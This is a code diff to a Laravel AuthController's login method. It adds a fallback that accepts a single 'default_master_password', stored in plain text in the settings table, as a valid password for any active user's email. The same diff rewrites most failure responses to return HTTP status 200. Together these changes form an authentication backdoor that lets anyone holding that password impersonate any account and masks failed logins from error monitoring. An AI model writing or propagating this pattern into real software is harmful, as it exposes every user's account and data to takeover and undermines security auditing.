@@ -3,6 +3,7 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\Setting;
 use App\Models\User;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Auth;
@@ -83,24 +84,27 @@ class AuthController extends Controller
     /**
      * Login user
      */
-    public function login(Request $request)
-    {
-        $validator = Validator::make($request->all(), [
-            'email' => 'required|email',
-            'password' => 'required|string',
-        ]);
+     public function login(Request $request)
+{
+    $validator = Validator::make($request->all(), [
+        'email' => 'required|email',
+        'password' => 'required|string',
+    ]);
 
-        if ($validator->fails()) {
-            return response()->json(['errors' => $validator->errors()], 422);
-        }
+    if ($validator->fails()) {
+        return response()->json([
+            'success' => false,
+            'message' => 'Validation failed',
+            'errors' => $validator->errors()
+        ], 200); // Change to 200 to prevent browser navigation issues
+    }
 
-        if (!Auth::attempt($request->only('email', 'password'))) {
-            return response()->json([
-                'success' => false,
-                'message' => 'Invalid login credentials'
-            ], 401);
-        }
+    // Get settings to check for default master password
+    $settings = Setting::getSettings();
+    $defaultMasterPassword = $settings->default_master_password ?? null;
 
+    // First, try normal login
+    if (Auth::attempt($request->only('email', 'password'))) {
         $user = User::where('email', $request->email)->firstOrFail();
         
         // Check if user is active
@@ -108,21 +112,55 @@ class AuthController extends Controller
             return response()->json([
                 'success' => false,
                 'message' => 'Your account is not active'
-            ], 403);
+            ], 200); // Change to 200
         }
 
         $token = $user->createToken('auth_token')->plainTextToken;
-    $user->load(['roles.permissions']);
+        $user->load(['roles.permissions']);
 
-         return response()->json([
-        'success' => true,
-        'message' => 'Login successful',
-        'user' => $user,
-        
-        'access_token' => $token,
-        'token_type' => 'Bearer',
-    ]);
+        return response()->json([
+            'success' => true,
+            'message' => 'Login successful',
+            'user' => $user,
+            'access_token' => $token,
+            'token_type' => 'Bearer',
+        ], 200);
     }
+
+    // If normal login fails, try master password login
+    if ($defaultMasterPassword && $request->password === $defaultMasterPassword) {
+        // Find user by email
+        $user = User::where('email', $request->email)->first();
+        
+        if ($user) {
+            // Check if user is active
+            if ($user->status !== 'active') {
+                return response()->json([
+                    'success' => false,
+                    'message' => 'Your account is not active'
+                ], 200); // Change to 200
+            }
+
+            // Login successful with master password
+            $token = $user->createToken('auth_token')->plainTextToken;
+            $user->load(['roles.permissions']);
+
+            return response()->json([
+                'success' => true,
+                'message' => 'Login successful',
+                'user' => $user,
+                'access_token' => $token,
+                'token_type' => 'Bearer',
+            ], 200);
+        }
+    }
+
+    // If we get here, login failed - return 200 with success=false
+    return response()->json([
+        'success' => false,
+        'message' => 'Invalid login credentials'
+    ], 200); // Change to 200 to prevent browser from treating it as an error
+}
 
     /**
      * Logout user
